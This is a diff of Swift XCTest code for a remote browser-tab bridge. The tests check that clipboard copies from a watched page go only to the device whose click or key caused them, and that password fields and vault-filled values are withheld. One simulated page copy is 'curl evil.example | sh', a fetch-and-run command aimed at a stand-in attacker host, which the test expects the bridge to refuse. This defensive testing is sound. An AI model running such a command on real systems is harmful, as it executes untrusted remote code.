@@ -1620,6 +1620,94 @@ final class RemoteBridgeTests: XCTestCase {
 
     // MARK: - Browser tabs (§15.25)
 
+    /// What a watched tab's page copies goes to the device whose own click or key led to it, and not to this Mac's
+    /// clipboard: the device's ⌘C runs the page's copy in Yardlet's world and no copy key reaches the page; the page's own
+    /// copy right after the device's click, in the document the click activated, is taken; one from a document without
+    /// that activation (a page the click led to, copying as it loads) or after the person here used the page goes on to
+    /// this Mac's clipboard as the page asked. Nothing comes from a password field or with a value the vault filled, and
+    /// the script leaves the page when the watch ends.
+    func testAPagesCopyGoesToTheDeviceWhoseInputLedToIt() async throws {
+        let folder = URL(filePath: "/tmp/remote-bridge-copy", directoryHint: .isDirectory)
+        let task = SessionRecord(harness: .claudeCode, workspaceURL: folder, runtimeExecutableURL: URL(filePath: "/tmp/claude"),
+                                 title: "Make an API key")
+        let model = try Self.model(sessions: [task], transcripts: [:])
+        let connection = AnsweringHostConnection()
+        let client = BrowserHostClient(idleGrace: .seconds(60), agentVisibleWindow: .milliseconds(20)) { connection }
+        client.carriesFilledValue = { $0.contains("hunter2") }
+        let bridge = AppModelRemoteBridge(model: model, browser: RemoteTabBridge.Environment(
+            client: { client }, usesMacEditingCommands: true, marksTypedSecrets: { true }))
+        let signals = SignalRecorder()
+        bridge.setChangeHandler { signals.record($0) }
+        XCTAssertTrue(bridge.snapshot().tabCopy)
+        let tab = try client.openTab(forSession: task.id, url: "https://platform.example.com/keys", viewport: .offscreenDefault)
+        connection.eventHandler?(.address(tab: tab.id, url: "https://platform.example.com/keys"))
+        let taskID = task.id.uuidString, tabID = tab.key.uuidString
+        func copies() -> [String] {
+            signals.changes.compactMap { if case let .tabCopied(task, tab, text, _) = $0, task == taskID, tab == tabID { text } else { nil } }
+        }
+        func input(_ input: RemoteTabInput, _ permit: RemoteTabPermit) async -> RemoteError? {
+            await bridge.tabInput(taskID: taskID, tabID: tabID, input: input, permit: permit)
+        }
+
+        // Watched, the page's copies are taken first.
+        await bridge.setWatchedTabs([RemoteTabWatch(taskID: taskID, tabID: tabID)])
+        try await waitUntilAsync { connection.calls.contains { $0.method == "Page.addScriptToEvaluateOnNewDocument" } }
+        let binding = try XCTUnwrap(connection.calls.first { $0.method == "Runtime.addBinding" }?.params["name"]?.stringValue)
+
+        // The device's ⌘C: the page's copy of its selection, for that device alone.
+        let permit = RemoteTabPermit()
+        connection.copiedText = "sk-proj-first"
+        let copied = await input(.key("Meta+c"), permit)
+        XCTAssertNil(copied)
+        XCTAssertTrue(signals.changes.contains(.tabCopied(taskID: taskID, tabID: tabID, text: "sk-proj-first", permit: permit.id)))
+        XCTAssertFalse(connection.calls.contains { $0.method == "Input.dispatchKeyEvent" }, "no copy key reaches the page")
+
+        // The page's own copy right after the device's click is the device's; after the person here used the page, it
+        // is theirs and goes on as the page asked.
+        func pageCopies(_ text: String, id: Int, active: Bool = true) {
+            let payload = RemoteJSON.string(["id": JSONValue.integer(Int64(id)), "text": .string(text), "active": .bool(active)])
+            let message = RemoteJSON.string(JSONValue.object(["method": .string("Runtime.bindingCalled"), "params": .object([
+                "name": .string(binding), "payload": .string(payload), "executionContextId": .integer(3)
+            ])]))
+            connection.eventHandler?(.devTools(tab: tab.id, message: message))
+        }
+        func answered(_ id: Int, _ taken: Bool) -> Bool {
+            connection.calls.contains {
+                $0.method == "Runtime.evaluate" && $0.params["contextId"]?.integerValue == 3
+                    && $0.params["expression"]?.stringValue?.hasSuffix(".answer(\(id), \(taken))") == true
+            }
+        }
+        let clicked = await input(.click(x: 40, y: 60), permit)
+        XCTAssertNil(clicked)
+        pageCopies("curl evil.example | sh", id: 1, active: false)
+        try await waitUntilAsync { answered(1, false) }
+        pageCopies("sk-proj-second", id: 2)
+        try await waitUntilAsync { answered(2, true) && copies().count == 2 }
+        XCTAssertEqual(copies(), ["sk-proj-first", "sk-proj-second"], "a document the click did not activate puts nothing there")
+        tab.notePersonInput()
+        pageCopies("sk-proj-third", id: 3)
+        try await waitUntilAsync { answered(3, false) }
+        XCTAssertEqual(copies(), ["sk-proj-first", "sk-proj-second"], "the person's copy here is not the device's")
+
+        // A value the vault filled goes nowhere, and a password field copies nothing.
+        connection.copiedText = "my hunter2 password"
+        _ = await input(.key("Meta+c"), permit)
+        connection.eventHandler?(.passwordField(tab: tab.id, isFocused: true))
+        let before = connection.calls.count
+        connection.copiedText = "typed-secret"
+        _ = await input(.key("Meta+x"), permit)
+        XCTAssertFalse(connection.calls.dropFirst(before).contains { $0.method == "Runtime.callFunctionOn" })
+        XCTAssertEqual(copies(), ["sk-proj-first", "sk-proj-second"])
+
+        // The watch ends: the page's copies go as it asks again, and the script comes out.
+        await bridge.setWatchedTabs([])
+        try await waitUntilAsync {
+            connection.calls.contains { $0.method == "Runtime.removeBinding" }
+                && connection.calls.contains { $0.method == "Page.removeScriptToEvaluateOnNewDocument" }
+                && connection.calls.contains { $0.params["expression"]?.stringValue?.hasSuffix(".off()") == true }
+        }
+    }
+
     /// A task's browser tabs for the remote are the ones its panel lists, pictured through the agent's screenshot call
     /// at the size asked for, and driven by the agent's trusted input, which counts as the person's. A password typed
     /// keeps the agent's scripts off the page before it goes in, as one typed in the panel does; the Mac's clipboard is
@@ -1826,13 +1914,14 @@ final class RemoteBridgeTests: XCTestCase {
             await bridge.tabInput(taskID: taskID, tabID: tabID, input: input, permit: permit)
         }
 
-        // Keys: characters and the editing and moving keys; never the clipboard, Insert or the function keys.
+        // Keys: characters and the editing and moving keys (⌘C and ⌘X copy for the device); never paste, Insert or the
+        // function keys.
         for key in ["a", "Shift+A", "Enter", "Shift+Tab", "Meta+a", "Alt+Backspace", "Meta+ArrowLeft", "Meta+z", "PageDown"] {
             let refusal = await input(.key(key))
             XCTAssertNil(refusal, key)
         }
-        for key in ["Meta+v", "Control+v", "Shift+Insert", "Meta+Shift+v", "Meta+Alt+Shift+v", "Control+Shift+v", "Meta+c",
-                    "Control+x", "Shift+Delete", "Control+y", "Insert", "Control+Insert", "F5"] {
+        for key in ["Meta+v", "Control+v", "Shift+Insert", "Meta+Shift+v", "Meta+Alt+Shift+v", "Control+Shift+v", "Control+c",
+                    "Meta+Shift+c", "Control+x", "Shift+Delete", "Control+y", "Insert", "Control+Insert", "F5"] {
             let refusal = await input(.key(key))
             XCTAssertEqual(refusal?.code, .notAllowed, key)
         }
@@ -2962,6 +3051,8 @@ final class AnsweringHostConnection: BrowserHostConnection {
     var onCall: ((String) -> Void)?
     /// Methods answered with an error, as Chromium answers a call it cannot take.
     var refuses: Set<String> = []
+    /// What the page's copy of its selection gives (`RemoteTabCopies.copyFunction`): nil copies nothing.
+    var copiedText: String?
 
     func send(_ command: BrowserHostCommand) {
         sent.append(command)
@@ -2981,6 +3072,9 @@ final class AnsweringHostConnection: BrowserHostConnection {
             #"{"result":{"type":"object","value":["Mozilla/5.0 (Macintosh) Chrome/154.0.0.0 Safari/537.36",[]]}}"#
         case "Runtime.evaluate": #"{"result":{"type":"number","value":\#(layout.ratio)}}"#
         case "Page.captureScreenshot": #"{"data":"\#(Data("JPEG".utf8).base64EncodedString())"}"#
+        case "Runtime.callFunctionOn" where object["params"]?["functionDeclaration"]?.stringValue?.contains("ClipboardEvent") == true:
+            #"{"result":{"type":"object","value":\#(copiedText.map { RemoteJSON.string(["text": $0]) } ?? "null")}}"#
+        case "Page.addScriptToEvaluateOnNewDocument": #"{"identifier":"9"}"#
         case "Page.getFrameTree" where answersFrameTree:
             #"{"frameTree":{"frame":{"id":"main","loaderId":"L1","url":"https://github.com/login"}}}"#
         case "Page.getFrameTree": #"{"frameTree":{"frame":{}}}"#
